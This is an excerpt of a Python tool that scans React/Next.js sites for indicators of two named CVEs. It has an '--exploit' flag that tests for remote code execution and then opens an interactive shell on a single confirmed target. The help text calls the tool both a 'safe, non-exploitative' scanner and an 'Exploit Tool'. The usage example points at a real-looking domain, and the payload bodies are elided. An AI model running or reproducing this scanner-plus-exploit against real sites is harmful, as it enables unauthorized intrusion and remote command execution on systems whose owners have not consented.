...
Usage examples:
  ...
  python3 react_nextjs_scanner.py https://bjk.com --timeout 5
...
def analyze_responses(responses: dict) -> dict:
    ...
    for ep, resp in responses.items():
        ...
        # Check for RSC content type
        content_type = resp.headers.get("Content-Type", "").lower()
        if "text/x-component" in content_type:
            findings["cve_2025_55182"]["indicator"] = True
            findings["cve_2025_55182"]["evidence"].append(f"Content-Type 'text/x-component' (RSC) detected on {ep}")
...
def check_rce_vulnerability(url, verbose=False):
    """
    ...
    if verbose:
        print(f"[*] Verifying RCE exploitability on {target_url}...")
    ...
    try:
        ...
        if r.status_code == 200 and "vulnerable" in r.text:
            if verbose: print("[+] Target is VULNERABLE! (Response matched header injection)")
            return True, "header"
        ...
        if r.status_code == 200 and "vulnerable" in r.text:
             if verbose: print("[+] Target is VULNERABLE! (Body Trigger)")
             return True, "body"

    except Exception as e:
        if verbose: print(f"[-] RCE Check failed: {e}")
        return False, None
        
    if verbose: print("[-] Target does not appear vulnerable to this specific RCE.")
    return False, None
...
def main():
    parser = argparse.ArgumentParser(description="Safe CVE indicator scanner (heuristic, non-exploitative) & Exploit Tool.")
    ...
    parser.add_argument("--exploit", action="store_true", help="Attempt to exploit RCE if vulnerable indicators found")
    ...
    for t in targets:
        try:
            ...
            is_potential_vuln = res["cve_2025_55182"]["indicator"] or res["cve_2025_66478"]["indicator"]
            
            if is_potential_vuln:
                vulnerable_findings.append(url)
                
            # If exploit mode is on and indicators found (or we just want to try anyway)
            if args.exploit:
                print(f"\n[*] Attempting exploitation on {url}...")
                is_rce, trigger = check_rce_vulnerability(url, verbose=args.verbose)
                if is_rce:
                    print(f"[!] RCE Confirmed on {url}!")
                    # If single target, drop to shell immediately
                    if len(targets) == 1:
                        run_shell(url, trigger)
                    else:
                        print(f"[!] Skipping interactive shell for bulk scan. Target {url} is VULNERABLE.")
                else:
    ...
    if args.file:
        ...
        if vulnerable_findings:
            print(f"Found {len(vulnerable_findings)} potential targets (Indicators Detected):")
